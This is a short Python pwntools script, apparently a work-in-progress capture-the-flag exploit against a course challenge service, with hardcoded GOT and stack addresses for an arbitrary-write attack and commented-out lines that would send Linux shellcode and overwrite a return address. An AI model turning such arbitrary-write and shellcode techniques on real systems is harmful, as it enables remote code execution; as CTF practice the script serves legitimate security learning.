from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10127

r = remote(host, port)

put_got = 0x601020
read_got = 0x601048

your_name_addr = 0x6010a0
where_want_write = 0x40098d
ret_addr = 0x7fffffffdcd8

input('Press enter to continue.')

# what's your name :
r.recvuntil(':')
# r.sendline(asm(pwnlib.shellcraft.linux.sh()))
r.sendline(b'aaaaaaaaaaaaaaaa')

# Where do you want to write :
r.recvuntil(':')
r.sendline(hex(ret_addr).encode())

# data :
r.recvuntil(':')
r.sendline(b'a'*8)
# r.sendline(p64(where_want_write))

r.interactive()
